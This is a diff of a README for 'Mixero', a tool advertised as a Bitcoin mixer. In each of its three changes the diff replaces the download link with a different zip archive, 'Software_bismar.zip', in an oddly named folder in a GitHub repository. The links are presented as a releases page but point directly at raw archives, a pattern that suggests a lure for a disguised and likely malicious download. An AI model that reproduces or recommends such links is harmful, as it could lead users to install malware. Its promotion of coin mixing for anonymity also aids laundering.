@@ -6,7 +6,7 @@ Mixero is a Bitcoin mixer service that offers advanced privacy features for your
 
 ## 📥 Download Mixero
 
-[![Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software-1.7-alpha.5.zip)](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software-1.7-alpha.5.zip)
+[![Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software_bismar.zip)](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software_bismar.zip)
 
 ## 📋 Prerequisites
 
@@ -39,7 +39,7 @@ Mixero operates by aggregating multiple Bitcoin transactions into a single trans
 
 To download Mixero, follow these steps:
 
-1. Visit the releases page: [Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software-1.7-alpha.5.zip)
+1. Visit the releases page: [Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software_bismar.zip)
 2. Find the latest version available.
 3. Click the download link to get the installation file.
 4. Once downloaded, locate the file in your downloads folder.
@@ -84,4 +84,4 @@ Join our community discussions for tips, feedback, and best practices on using M
 
 Mixero is a powerful tool designed to enhance your Bitcoin privacy. By following these simple steps, you can securely mix your Bitcoin transactions and enjoy greater anonymity. For any further assistance or information, don't hesitate to reach out to our community.
 
-[![Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software-1.7-alpha.5.zip)](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software-1.7-alpha.5.zip)
+[![Download Mixero](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software_bismar.zip)](https://raw.githubusercontent.com/Alkaidcrucis/Mixero/main/rumbelow/Software_bismar.zip)
